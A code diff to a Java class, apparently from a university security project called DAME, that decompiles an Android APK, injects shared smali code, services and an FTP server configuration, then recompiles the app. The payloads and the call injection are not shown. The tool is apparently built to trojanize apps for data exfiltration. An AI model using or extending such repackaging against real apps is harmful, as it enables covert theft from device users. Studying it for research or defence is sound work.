@@ -1,9 +1,11 @@
 package it.unisannio.srss.dame.cli;
 
 import it.unisannio.srss.dame.android.payloads.Payload;
+import it.unisannio.srss.dame.injection.CommonInjector;
 import it.unisannio.srss.dame.model.FTPServerConfig;
 import it.unisannio.srss.dame.model.Permission;
 import it.unisannio.srss.dame.model.UsagePoint;
+import it.unisannio.srss.utils.ApkUtils;
 import it.unisannio.srss.utils.ExecUtils;
 import it.unisannio.srss.utils.FileUtils;
 
@@ -32,15 +34,16 @@ public class Dame {
 	private final static Logger log = LoggerFactory.getLogger(Dame.class);
 
 	private final static String PAYLOADS_BASE_PACKAGE = "it.unisannio.srss.android.payloads";
-	private final static String APKTOOL_DEFAULT_PATH = "tools/apktool";
-	private final static String ANDROGUARD_DEFAULT_PATH = "~/tools/androguard/";
-	private final static String BUILD_TOOLS_DEFAULT_PATH = "~/tools/android/android-sdk-linux_x86/build-tools/21.1.2/";
-	private final static String PYTHON_DEFAULT_PATH = "python";
 
-	private final static String PERMISSIONS_SCRIPT_PATH = "scripts/permission_extractor.py";
-	private final static String SMALI_TO_APK_SCRIPT_PATH = "scripts/smaliToSignedApk.py";
+	public final static String APKTOOL_DEFAULT_PATH = "./tools/apktool";
+	public final static String ANDROGUARD_DEFAULT_PATH = "~/tools/androguard/";
+	public final static String BUILD_TOOLS_DEFAULT_PATH = "~/tools/android/android-sdk-linux_x86/build-tools/21.1.2/";
+	public final static String PYTHON_DEFAULT_PATH = "python";
+	public final static String DEFAULT_SERVER_CONFIG_FILE = "config.properties";
+	public final static String DEFAULT_OUT_APK_FILE = "out.apk";
 
-	private final static String DEFAULT_SERVER_CONFIG_FILE = "config.properties";
+	private final static String PERMISSIONS_SCRIPT_PATH = "./scripts/permission_extractor.py";
+	private final static String COMMON_SMALI_PATH = "./common-smali/";
 
 	private String apkIn = null;
 	private String apkOut = null;
@@ -52,7 +55,7 @@ public class Dame {
 
 	private String androguardPath = ANDROGUARD_DEFAULT_PATH;
 	private String androidBuildToolsPath = BUILD_TOOLS_DEFAULT_PATH;
-	
+
 	public String getApkIn() {
 		return apkIn;
 	}
@@ -149,8 +152,9 @@ public class Dame {
 		FileUtils.checkDir(androguardPath);
 
 		StringBuffer outputBuffer = new StringBuffer();
-		int exitCode = ExecUtils.exec(outputBuffer, pythonPath, script.getAbsolutePath(),
-				apkIn.getAbsolutePath(), androguardPath);
+		int exitCode = ExecUtils.exec(outputBuffer, pythonPath,
+				script.getAbsolutePath(), apkIn.getAbsolutePath(),
+				androguardPath);
 		String output = outputBuffer.toString();
 		if (exitCode != 0) {
 			log.error(output);
@@ -168,7 +172,10 @@ public class Dame {
 	}
 
 	public void inject(List<Payload> payloads) throws IOException {
+		FileUtils.checkDir(COMMON_SMALI_PATH);
+
 		FTPServerConfig ftpServerConfig;
+		log.info("Loading FTP server configuration.");
 		try {
 			ftpServerConfig = getServerConfig();
 		} catch (IOException e) {
@@ -177,12 +184,22 @@ public class Dame {
 		}
 		log.info("FTP server configuration sucessfully loaded");
 		log.debug(ftpServerConfig.toString());
-		
-		// TODO apk to smali
-		// TODO common injection
-		// TODO call injection
-		// TODO smali to apk (default out.apk nella stessa cartella di apkIn)
-		// TODO rimozione dati temporanei
+
+		File decompiledDir = ApkUtils.decompile(apkIn, apktoolPath);
+
+		CommonInjector.injectSmali(new File(COMMON_SMALI_PATH).toPath(),
+				decompiledDir.toPath());
+		CommonInjector.injectServices(decompiledDir.toPath());
+		CommonInjector.injectFtpConfig(decompiledDir.toPath(), ftpServerConfig);
+
+		// TODO generare la mappa payload permissions
+
+		// CallInjector injector = new CallInjector(getAPKPermissions(),
+		// payloadPermissions, decompiledDir.getAbsolutePath())
+		// injector.inject()
+
+		ApkUtils.compile(decompiledDir.getAbsolutePath(),
+				androidBuildToolsPath, apktoolPath, getApkOutPath());
 	}
 
 	private FTPServerConfig getServerConfig() throws IOException {
@@ -194,6 +211,17 @@ public class Dame {
 			serverConfigPath = path + DEFAULT_SERVER_CONFIG_FILE;
 		}
 		return FTPServerConfig.loadFromFile(serverConfigPath);
+	}
+
+	private String getApkOutPath() {
+		if (apkOut == null) {
+			// se non è stato impostato, si usa il default
+			String path = (new File(apkIn)).getParent();
+			if (!path.endsWith(File.separator))
+				path += File.separator;
+			apkOut = path + DEFAULT_OUT_APK_FILE;
+		}
+		return apkOut;
 	}
 
 }
